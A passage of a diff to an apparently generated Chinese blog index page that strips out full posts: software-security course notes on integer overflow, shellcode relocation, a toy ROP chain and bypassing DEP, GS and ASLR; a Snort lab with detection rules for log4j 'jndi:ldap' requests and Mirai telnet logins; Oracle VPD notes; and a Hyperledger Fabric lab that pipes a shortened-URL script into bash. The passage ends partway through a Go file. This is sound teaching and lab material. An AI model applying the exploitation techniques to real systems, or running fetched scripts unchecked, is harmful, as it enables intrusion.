-<li><strong>整数溢出：</strong> <code>if(len &gt; 256)</code> 检查确保 <code>len</code> 不超过 256，但是这并不足以防止整数溢出。在 <code>memcpy(data, buf, len)</code> 中，如果 <code>len</code> 是负数，它将被转换为一个很大的正数，导致超出 <code>data</code> 数组的范围。应该确保 <code>len</code> 是非负的。</li>
-</ol>
-<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><ul>
-<li>避免隐患运算，如正数相加，相乘</li>
-<li>越界判断，整数安全意识等等</li>
-</ul>
-<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> a = (<span class="type">short</span>)<span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    b = a;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of short: %zu bytes\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of int: %zu bytes\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b=%d    \r\n&quot;</span>, b);</span><br><span class="line">    b = (a &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b=%d    \r\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输出：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b=-1</span><br><span class="line">b=65535</span><br></pre></td></tr></table></figure>
-
-<p>解析：</p>
-<p>这段代码首先定义了一个 <code>short</code> 类型的变量 <code>a</code>，并将其初始化为 <code>0xFFFF</code>，这是一个16位的二进制数，所有位都是1。在 C 语言中，<code>short</code> 类型是有符号的，所以 <code>0xFFFF</code> 实际上表示的是 <code>-1</code>。</p>
-<p>然后，代码将 <code>a</code> 的值赋给了一个 <code>int</code> 类型的变量 <code>b</code>。由于 <code>int</code> 类型通常比 <code>short</code> 类型有更多的位（通常是32位），所以在赋值过程中，<code>a</code> 的值会被符号扩展。也就是说，如果 <code>a</code> 的最高位（符号位）是1，那么在赋值给 <code>b</code> 时，<code>b</code> 的高位也会被设置为1。因此，<code>b</code> 的值也会是 <code>-1</code>。</p>
-<p>接下来，代码打印了 <code>b</code> 的值，所以第一行输出应该是 <code>b=-1</code>。</p>
-<p><strong>然后</strong>，代码将 <code>a</code> 与 <code>0xFFFF</code> 进行了位与操作，并将结果赋给了 <code>b</code>。在 C 语言中，<code>0xFFFF</code> 是一个字面量，其默认类型是 <code>int</code>。当你写 <code>a &amp; 0xFFFF</code> 时，<code>a</code> 是 <code>short</code> 类型，<code>0xFFFF</code> 是 <code>int</code> 类型，所以在进行位与操作之前，<code>a</code> 会被提升为 <code>int</code> 类型以匹配 <code>0xFFFF</code> 的类型。这个过程被称为整数提升。所以，这一次赋值过程中不会发生符号扩展，这次 <code>b</code> 是直接被赋值为 <code>0xFFFF</code>，并没有发生符号扩展。因此，<code>b</code> 的值会被解释为无符号整数，即 <code>65535</code>。</p>
-<p>最后，代码再次打印了 <code>b</code> 的值，所以第二行输出应该是 <code>b=65535</code>。</p>
-<h2 id="漏洞利用与发现"><a href="#漏洞利用与发现" class="headerlink" title="漏洞利用与发现"></a>漏洞利用与发现</h2><h3 id="目标与整体流程"><a href="#目标与整体流程" class="headerlink" title="目标与整体流程"></a>目标与整体流程</h3><ul>
-<li>修改内存变量</li>
-<li>修改代码逻辑，跳转</li>
-<li>修改函数返回地址</li>
-<li>修改函数指针</li>
-<li>修改异常处理函数指针，比如SEH</li>
-<li>修改线程同步函数指针</li>
-</ul>
-<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>API重定位技术：常见的重定位代码，巧妙使用了delta这一个标签来定位相对偏移量，并且将值存放在ebx中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Relocate	proc</span><br><span class="line">	call	delta</span><br><span class="line">delta:</span><br><span class="line">	pop	ebx</span><br><span class="line">	sub	ebx,offset delta</span><br><span class="line">	ret</span><br><span class="line">Relocate	endp</span><br></pre></td></tr></table></figure>
-
-<h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented-Programming"></a>Return-Oriented-Programming</h3><p>为了应对DEP保护而出现的攻击机制，DEP保护指的是内存分块后设置不同的权限，数据区块仅有读写权限无法执行，这样那里的shellcode就不能起作用了。</p>
-<p>shellcode的解决办法：向其他地方借代码，利用系统提供的API函数关闭DEP功能。</p>
-<p><img src="/images/image-20240116192733134.png" alt="image-20240116192733134"></p>
-<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p>假设内存中存在各种所需的ROP代码段，并且已知一个数存放在0x0A69地址，另外一个数存在0x0A89地址，尝试利用ROP设计一个完成0x0A69所在的值减去0x0A89所在的值，并将结果保存到0x0AF0：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0xA: pop eax; ret</span><br><span class="line">0xB: mov ebx,[eax]; ret</span><br><span class="line">0xC: mov ecx,[eax]; ret</span><br><span class="line">0xD: sub ebx,ecx; ret</span><br><span class="line">0xE: mov [eax],ebx; ret</span><br><span class="line"></span><br><span class="line">;stack:</span><br><span class="line">esp		0xA</span><br><span class="line">esp+4	0x0A69</span><br><span class="line">esp+8	0xB</span><br><span class="line">esp+12	0xA</span><br><span class="line">esp+16	0x0A89</span><br><span class="line">esp+20	0xC</span><br><span class="line">esp+24	0xD</span><br><span class="line">esp+28	0xA</span><br><span class="line">esp+32	0x0AF0</span><br><span class="line">esp+36	0xE</span><br></pre></td></tr></table></figure>
-
-<p>思想：EIP从栈中取得执行指令的地址，返回后EIP从移动后的栈顶取得返回后将要执行指令的地址。</p>
-<ul>
-<li>先执行0xA语句，pop出第一个数的地址到eax中，接着ret返回的地址是0xB</li>
-<li>执行0xB的语句，把第一个数存入ebx，ret返回的地址是0xA</li>
-<li>执行0xA的语句，pop出第二个数的地址到eax中，接着ret返回的地址是0xC</li>
-<li>执行0xC的语句，把第二个数存入ecx，接着ret返回的地址是0xD</li>
-<li>执行0xD的语句，两数相减并存放在ebx中，接着ret返回的地址是0xA</li>
-<li>执行0xA的语句，将存储目标地址pop到exa中，接着ret返回的地址是0xE</li>
-<li>执行0xE的语句，将ebx的数据写入目标地址。</li>
-</ul>
-<h3 id="静态分析，动态分析"><a href="#静态分析，动态分析" class="headerlink" title="静态分析，动态分析"></a>静态分析，动态分析</h3><p>软件漏洞挖掘技术：</p>
-<ul>
-<li>静态分析，扫描源码，软件中可能出现的漏洞</li>
-<li>动态分析，收集运行过程中的信息，检测可能的漏洞</li>
-</ul>
-<p>Fuzzing模糊测试：对程序输入不正确、异常或随机的数据来评估稳定性和安全性。</p>
-<p>Fuzzing的难点和提高效率：输入值在特定小范围引发的异常，几个输入同时作用下引发的异常，需要满足特定的数据、文件格式后才引发的异常。提高Fuzzing的效率的方法包括使用更智能的输入生成策略，如输入的格式分割，输入的字段的约束，输入的字段之间的约束等。</p>
-<h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><p>win系统安全机制以及漏洞防护技术</p>
-<h2 id="DEP-NX"><a href="#DEP-NX" class="headerlink" title="DEP&#x2F;NX"></a>DEP&#x2F;NX</h2><p>DEP数据执行保护，前文提到过，由于shellcode一般位于堆栈中，因此可以限制数据区的执行权限，禁用堆栈中代码的执行，实现代码和数据的分离。</p>
-<p>许多现代的CPU都支持DEP特性。</p>
-<p>当然，可以通过Ret2Libc，ROP等方法绕过DEP保护。</p>
-<p>缺陷：兼容性问题；不方便进行测试与调试等；无法防御ROP，Ret2Libc等代码借用的攻击。</p>
-<h2 id="Stack-Guard-Stack-Canary"><a href="#Stack-Guard-Stack-Canary" class="headerlink" title="Stack Guard&#x2F;Stack Canary"></a>Stack Guard&#x2F;Stack Canary</h2><p>GS（就是GS）栈溢出检查，在函数开始时往栈中压入一个可检验的随机数，函数结束时验证栈中的随机数是否不变，由此来防止栈溢出。</p>
-<p>现代编译器基本支持该安全措施。</p>
-<p>当然，可以通过利用未被保护的函数，覆盖虚函数，攻击异常处理，同时替换栈和data中的cookie绕过。</p>
-<p>缺陷：性能损失；应用场景受限，不能覆盖所有类型的函数（如不包含缓冲区的函数等）等等；同时也无法防御堆溢出攻击；无法防御改写函数指针的攻击（C++虚函数）。</p>
-<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR地址空间布局随机化，堆栈的基地址是加载时动态随机确定的，程序自身和关联库的基地址是加载时动态随机确定的，比如每次加载dll动态链接库时使用不同的地址，kernel32，系统函数，库函数的地址随机化等等等等。</p>
-<p>windows早已支持ASLR，visual studio可以设置动态加载库的基地址。</p>
-<p>缺陷：兼容性问题，一些需要特定内存地址布局的程序会出问题；需要配合DEP，否则还是可以获得基地址；ASLR的熵比较小，只有255；地址的部分字节随机而已，并不是完全随机。</p>
-<h1 id="12"><a href="#12" class="headerlink" title="12"></a>12</h1><p>威胁建模过程</p>
-<p>威胁树：对威胁分类后，对可能遭受的威胁进行描述：</p>
-<p><img src="/images/image-20240116205237182.png" alt="image-20240116205237182"></p>
-
+        <p>软件安全课程相关记录</p>
+        
+          <p class="article-more-link">
+            <a href="/2024/04/15/Software-Security/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -491,68 +181,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>试验记录：使用snort提示对应网络入侵</p>
-<h2 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>环境为docker desktop for windows，安装好docker-snort，请使用管理员权限：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> --net=host linton/docker-snort /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>启动，规则文件位于<code>/etc/snort/rules/local.rules</code>，配置文件位于<code>/etc/snort/etc/snort.conf</code>。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snort -i eth0 -c /etc/snort/etc/snort.conf -A console</span><br></pre></td></tr></table></figure>
-
-<p>添加规则（其实已经添加好了），在docker desktop中开另一个终端ping一下，测试自定义的规则能不能检测到ping操作：</p>
-<p><img src="/images/image-20240104191835897.png" alt="image-20240104191835897"></p>
-<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>容器中安装nmap：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install nmap</span><br></pre></td></tr></table></figure>
-
-<p>添加规则：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert icmp any any -&gt; 8.8.8.8 any (msg:<span class="string">&quot;NMAP Ping Sweep Scan&quot;</span>;dsize:0;sid:1000004;)</span><br></pre></td></tr></table></figure>
-
-<p>启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snort -i eth0 -c /etc/snort/etc/snort.conf -A console</span><br></pre></td></tr></table></figure>
-
-<p>在docker desktop中再开一个终端，运行nmap扫描命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 8.8.8.8 -disable-arp-ping</span><br></pre></td></tr></table></figure>
-
-<p>观察一下能否检测到这个扫描操作：</p>
-<p><img src="/images/image-20240104200220391.png" alt="image-20240104200220391"></p>
-<h2 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>用wireshark打开<code>log4j-attempts.pcap</code>，观察一下log4j攻击的特征：</p>
-<p><img src="/images/image-20240104215541897.png" alt="image-20240104215541897"></p>
-<p>使用log4j相关的pcap文件，将<code>log4j-attempts.pcap</code>放在pcap目录下，然后用<code>docker cp</code>命令复制到容器里面去：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">cp</span> [<span class="built_in">dir</span>] [docker <span class="built_in">id</span>]:/home/</span><br></pre></td></tr></table></figure>
-
-<p>具体情形如下：</p>
-<p><img src="/images/image-20240104212909461.png" alt="image-20240104212909461"></p>
-<p>在<code>local.rules</code>中添加检测log4j攻击的规则：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; any 80 (content:<span class="string">&quot;jndi:ldap://&quot;</span>;content:<span class="string">&quot;GET&quot;</span>;http_method;sid:1000000;)</span><br></pre></td></tr></table></figure>
-
-<p>运行snort，检测log4j攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snort -r /home/pcap/log4j-attempts.pcap -c snort.conf -A console</span><br></pre></td></tr></table></figure>
-
-<p>启动：</p>
-<p><img src="/images/image-20240104213014573.png" alt="image-20240104213014573"></p>
-<p>捕获攻击网络包如下：</p>
-<p><img src="/images/image-20240104213059241.png" alt="image-20240104213059241"></p>
-<p>结果产生安全警告如下：</p>
-<p><img src="/images/image-20240104213121432.png" alt="image-20240104213121432"></p>
-<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>用wireshark打开<code>mirai.pcap</code>，观察一下mirai攻击的特征：</p>
-<p>![image-20240104222223894](..&#x2F;~picture bed&#x2F;netsecurity.assets&#x2F;image-20240104222223894.png)</p>
-<p>使用mirai相关的pcap文件，将<code>mirai.pcap</code>放在pcap2目录下，然后用<code>docker cp</code>命令复制到容器里面去：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">cp</span> [<span class="built_in">dir</span>] [docker <span class="built_in">id</span>]:/home/</span><br></pre></td></tr></table></figure>
-
-<p>具体情形如下：</p>
-<p><img src="/images/image-20240104223317929.png" alt="image-20240104223317929"></p>
-<p>在<code>local.rules</code>中添加检测mirai攻击的规则：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; any 23 (content:<span class="string">&quot;12345&quot;</span>;content:<span class="string">&quot;123456&quot;</span>;sid:1000000;)</span><br><span class="line"><span class="comment"># 23端口改成any也可以，这样扫的范围更广</span></span><br></pre></td></tr></table></figure>
-
-<p>运行snort，检测log4j攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snort -r /home/pcap2/mirai.pcap -c snort.conf -A console</span><br></pre></td></tr></table></figure>
-
-<p>启动：</p>
-<p><img src="/images/image-20240104223601542.png" alt="image-20240104223601542"></p>
-<p>捕获攻击网络包如下：</p>
-<p><img src="/images/image-20240104223648984.png" alt="image-20240104223648984"></p>
-<p>结果产生安全警告如下：</p>
-<p><img src="/images/image-20240104223712063.png" alt="image-20240104223712063"></p>
-
+        <p>网络安全实践：使用snort提示对应网络入侵</p>
+        
+          <p class="article-more-link">
+            <a href="/2024/04/15/Net-Security/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -593,23 +227,11 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>oracle数据库VPD策略机制</p>
-<h2 id="DBMS-RLS包"><a href="#DBMS-RLS包" class="headerlink" title="DBMS_RLS包"></a>DBMS_RLS包</h2><p>DBMS_RLS（Row-Level Security）是Oracle数据库中的一个包，它提供了一些函数和过程，用于实现行级安全性控制。下面是DBMS_RLS包中一些重要的函数和过程的详细介绍：</p>
-<ol>
-<li>ADD_POLICY：这个过程用于向指定的表添加一个行级安全性策略。它需要指定对象的模式名、对象名、策略名、策略函数的模式名、策略函数名以及适用的语句类型。</li>
-<li>DROP_POLICY：这个过程用于从指定的表中删除一个行级安全性策略。它需要指定对象的模式名、对象名和策略名。</li>
-<li>ENABLE_POLICY：这个过程用于启用或禁用指定表的行级安全性策略。它需要指定对象的模式名、对象名、策略名、策略类型以及是否启用。</li>
-<li>DISABLE_POLICY：这个过程用于禁用指定表的行级安全性策略。它需要指定对象的模式名、对象名和策略名。</li>
-<li>EVALUATE_PREDICATE：这个函数用于在给定的表上评估行级安全性谓词。它需要指定对象的模式名、对象名、列名和行ID，返回一个布尔值，表示谓词是否为真。</li>
-<li>ALTER_POLICY：这个过程用于修改指定表的行级安全性策略。它可以修改策略的名称、策略函数、适用的语句类型和策略类型。</li>
-<li>VALIDATE_POLICY：这个过程用于验证指定表的行级安全性策略是否有效。它需要指定对象的模式名、对象名和策略名。</li>
-<li>POLICY_CONTEXT：这个函数用于获取当前会话中的行级安全性上下文信息。它可以返回当前用户、当前角色、当前会话ID等上下文信息。</li>
-</ol>
-<p>DBMS_RLS包中的这些函数和过程提供了管理行级安全性策略的基本操作。通过使用这些函数和过程，管理员可以定义、修改、删除和验证行级安全性策略，以实现对数据库中数据的细粒度访问控制。同时，通过EVALUATE_PREDICATE函数和POLICY_CONTEXT函数，可以在应用程序中动态地评估行级安全性谓词和获取行级安全性上下文信息，从而实现更灵活和动态的安全性控制。</p>
-<h2 id="基本使用格式"><a href="#基本使用格式" class="headerlink" title="基本使用格式"></a>基本使用格式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION func0(</span><br><span class="line">p_schema in varchar2,</span><br><span class="line">p_object in varchar2)</span><br><span class="line">return varchar2</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">RETURN &#x27;ename=sys_context(&quot;USERENV&quot;,&quot;SESSION_USER&quot;)&#x27;;</span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">dbms_rls.add_policy(</span><br><span class="line">object_schema=&gt;&#x27;SYS&#x27;,</span><br><span class="line">object_name=&gt;&#x27;TEST01&#x27;,</span><br><span class="line">policy_name=&gt;&#x27;MY_POLICY&#x27;,</span><br><span class="line">policy_function=&gt;&#x27;func0&#x27;,</span><br><span class="line">statement_types =&gt; &#x27;SELECT,UPDATE,DELETE&#x27;</span><br><span class="line">);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
-
-<h2 id="应用程序上下文"><a href="#应用程序上下文" class="headerlink" title="应用程序上下文"></a>应用程序上下文</h2><p>使用应用程序上下文来简化行级访问控制的实现</p>
-<p>应用程序上下文总是由用户sys拥有</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/04/15/VPD/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -650,95 +272,11 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>区块链实验过程简单记录</p>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>一共两个实验，主要使用ubuntu23.04进行</p>
-<h3 id="fabric-1-4"><a href="#fabric-1-4" class="headerlink" title="fabric 1.4"></a>fabric 1.4</h3><h4 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h4><ul>
-<li>Go，参考官网使用官方脚本安装：<a target="_blank" rel="noopener" href="https://go.dev/doc/install">https://go.dev/doc/install</a></li>
-<li>Docker，根据官方脚本指引安装：<a target="_blank" rel="noopener" href="https://get.docker.com/">https://get.docker.com/</a></li>
-</ul>
-<p>注意go需要自己将bin添加到环境变量：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
-
-<h4 id="任务-1-Building-Your-First-Network"><a href="#任务-1-Building-Your-First-Network" class="headerlink" title="任务 1: Building Your First Network"></a>任务 1: Building Your First Network</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fabric</span><br><span class="line"><span class="built_in">cd</span> fabric</span><br><span class="line">curl -sSL http://bit.ly/2ysbOFE | bash -s -- 1.4.12 1.4.9 0.4.22</span><br><span class="line"><span class="built_in">cd</span> fabric-samples/first-network</span><br></pre></td></tr></table></figure>
-
-<p>如果连接不上<a target="_blank" rel="noopener" href="http://bit.ly/2ysbOFE%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%EF%BC%9A">http://bit.ly/2ysbOFE也可以使用：</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/hyperledger/fabric/master/scripts/bootstrap.sh | bash -s -- 1.4.12 1.4.9 0.4.22</span><br></pre></td></tr></table></figure>
-
-<p>结果我全都连不上，那么干脆直接把<a target="_blank" rel="noopener" href="http://bit.ly/2ysbOFE%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%8B%E5%8A%A8%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%EF%BC%9A">http://bit.ly/2ysbOFE下载下来，然后手动执行脚本：</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x bootstrap.sh</span><br><span class="line">sudo ./bootstrap.sh 1.4.12 1.4.9 0.4.22</span><br></pre></td></tr></table></figure>
-
-<p>这样是等效的，注意要sudo不然安装的时候docker会报权限不够</p>
-<p>到正确目录下以后启动试试看：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh generate</span><br><span class="line">./byfn.sh up</span><br></pre></td></tr></table></figure>
-
-<p>注意，在执行的时候可能会报命令或文件找不到，这是因为新版docker中命令已经由<code>docker-compose</code>改成了<code>docker compose</code>，他报哪行不对就把那一行改过来然后重新执行，实测<code>./byfn.sh up</code>和一会儿用到的<code>./byfn.sh down</code>会分别报一次</p>
-<p><img src="/images/image-20231130112232554.png" alt="image-20231130112232554"></p>
-<p>结束：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh down</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20231130112333766.png" alt="image-20231130112333766"></p>
-<h4 id="排故"><a href="#排故" class="headerlink" title="排故"></a>排故</h4><p>第二次generate时可能报错：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Error response from daemon: Conflict. The container name <span class="string">&quot;/cli&quot;</span> is already <span class="keyword">in</span> use by container <span class="string">&quot;f56d257a543fb157cf482758fb7ecbebfb1e04187643222bb71564e9cabb541c&quot;</span>. You have to remove (or rename) that container to be able to reuse that name.</span><br></pre></td></tr></table></figure>
-
-<p>把占用的容器直接remove掉：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> f56d257a543fb157cf482758fb7ecbebfb1e04187643222bb71564e9cabb541c</span><br></pre></td></tr></table></figure>
-
-<h4 id="任务-2-chaincode-编写"><a href="#任务-2-chaincode-编写" class="headerlink" title="任务 2: chaincode 编写"></a>任务 2: chaincode 编写</h4><p>在<code>fabric-samples/chaincode</code>目录下创建<code>vote</code>文件夹存储编写的代码，内容参考zjx佬</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vote.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;bytes&quot;</span></span><br><span class="line">   